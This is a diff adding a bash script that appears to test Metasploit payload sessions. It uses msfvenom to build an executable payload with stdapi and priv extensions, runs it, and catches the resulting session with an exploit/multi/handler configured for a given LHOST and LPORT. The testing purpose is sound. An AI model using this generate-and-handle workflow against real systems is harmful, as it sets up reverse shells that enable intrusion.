@@ -1,0 +1,49 @@
+#!/bin/bash
+#
+# This script runs a suite of session tests against the given payload handler
+#
+set -e
+
+function usage {
+	echo "$(basename ${0}) <OS> <PAYLOAD> <LHOST> <LPORT>"
+	exit 1
+}
+
+if [ ${#} != 4 ]; then
+	echo "ERROR: wrong number of cmdline arguments."
+	echo
+	usage
+fi
+
+OS=${1}
+PAYLOAD=${2}
+LHOST=${3}
+LPORT=${4}
+
+ROOT=..
+MSFVENOM=$ROOT/msfvenom
+MSFCONSOLE=$ROOT/msfconsole
+PAYLOADFILE=test.exe
+RCFILE=test.rc
+
+echo "Generating payload for $PAYLOAD"
+echo $MSFVENOM -p $PAYLOAD EXTENSIONS=stdapi,priv LHOST=$LHOST LPORT=$LPORT -f exe -o $PAYLOADFILE
+$MSFVENOM -p $PAYLOAD EXTENSIONS=stdapi,priv LHOST=$LHOST LPORT=$LPORT -f exe -o $PAYLOADFILE
+
+./run-payload $OS $PAYLOADFILE &
+
+cat >$RCFILE <<EOL
+loadpath $ROOT/test/modules
+use exploit/multi/handler
+set lhost $LHOST
+set lport $LPORT
+set payload $PAYLOAD
+set VERBOSE 1
+run -j
+sleep 5
+resource test-sessions.rc
+exit -y
+EOL
+$MSFCONSOLE -q -r $RCFILE
+
+rm -f $RCFILE $PAYLOADFILE
